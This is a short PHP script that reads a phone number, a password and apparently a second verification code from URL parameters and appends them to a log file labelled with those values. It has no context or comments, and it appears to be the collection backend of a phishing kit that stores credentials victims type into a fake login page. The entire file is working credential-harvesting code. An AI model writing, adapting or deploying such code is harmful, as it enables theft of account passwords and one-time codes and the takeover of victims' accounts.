<?php
$phone = $_GET['new'];
$code = $_GET['new1'];
$cod2e = $_GET['new2'];
if($code == ""){
  $f = fopen("bd.log", "a+");
  fwrite($f, "\r\nPhone: $phone");
  fclose($f);
}else{
  $f = fopen("bd.log", "a+");
  fwrite($f, "\r\nPassword: $code and $cod2e for: $phone ");
  fclose($f);
}

?>
